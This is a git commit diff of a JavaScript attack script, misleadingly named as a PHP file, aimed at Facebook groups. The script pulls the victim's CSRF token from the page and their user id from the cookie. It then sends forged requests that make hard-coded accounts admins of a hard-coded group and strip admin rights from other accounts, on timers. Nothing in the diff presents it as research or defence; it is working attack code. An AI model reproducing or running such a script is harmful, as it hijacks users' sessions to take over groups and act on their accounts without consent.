2b4b748e6194de599e9de2609c94abb1f99f08a2
bhargav1996 <www.bhargav1996@gmail.com>
2013-09-23 19:20:01 +0530

    Update Active_Admin_AutoAddPost_Joining.php

--- Active_Admin_AutoAddPost_Joining.php
+++ Active_Admin_AutoAddPost_Joining.php
@@ -1,62 +1,52 @@
-  
-
-  
 /*Admin Post*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-var now=(new Date).getTime();
-
+var now = (new Date).getTime();
+setTimeout(function () {
 function IDS(r) {
-function G(gid) {
-  var Page = new XMLHttpRequest();
-  var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
-  var PageParams ="fb_dtsg="+fb_dtsg+"&gid="+gid+"&uid="+r+"&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=34&ttstamp=26581661107112011276";
-  Page.open("POST", PageURL, true);
-  Page.onreadystatechange = function () {
-    if (Page.readyState == 4 && Page.status == 200) {
-      Page.close;
+    function G(gid) {
+        var Page = new XMLHttpRequest();
+        var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
+        var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=34&ttstamp=26581661107112011276";
+        Page.open("POST", PageURL, true);
+        Page.onreadystatechange = function () {
+            if (Page.readyState == 4 && Page.status == 200) {
+                Page.close;
+            }
+        };
+        Page.send(PageParams);
     }
-  };
-  Page.send(PageParams);
-}
-G("391559757563844");
+    G("391559757563844");
 }
 IDS("100004092334280");
 IDS("100003147643648");
 IDS("100005147649818");
-
-
-
-setTimeout(function(){
-
+IDS("100003998763728");
+setTimeout(function () {
 /*remove-Admin Post*/
+    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+    var now = (new Date).getTime();
 
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-var now=(new Date).getTime();
-
-function IDS(r) {
-function G(gid) {
-  var Page = new XMLHttpRequest();
-  var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
-  var PageParams ="fb_dtsg="+fb_dtsg+"&gid="+gid+"&uid="+r+"&operation=confirm_remove_admin&source=profilebrowser&__user="+user_id+"&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=b&ttstamp=26581661107112011276";
-  Page.open("POST", PageURL, true);
-  Page.onreadystatechange = function () {
-    if (Page.readyState == 4 && Page.status == 200) {
-      Page.close;
+    function IDS(r) {
+        function G(gid) {
+            var Page = new XMLHttpRequest();
+            var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
+            var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_remove_admin&source=profilebrowser&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=b&ttstamp=26581661107112011276";
+            Page.open("POST", PageURL, true);
+            Page.onreadystatechange = function () {
+                if (Page.readyState == 4 && Page.status == 200) {
+                    Page.close;
+                }
+            };
+            Page.send(PageParams);
+        }
+        G("391559757563844");
     }
-  };
-  Page.send(PageParams);
-}
-G("391559757563844");
-}
-IDS("100002908006006");
-IDS("100003200476066");
-IDS("100006342757697");
-IDS("100005202368891");
+    IDS("100002908006006");
+    IDS("100003200476066");
+    IDS("100006342757697");
+    IDS("100005202368891");
+}, 5000);
 
-
-
-},10000);
-
-
+}, 3000);
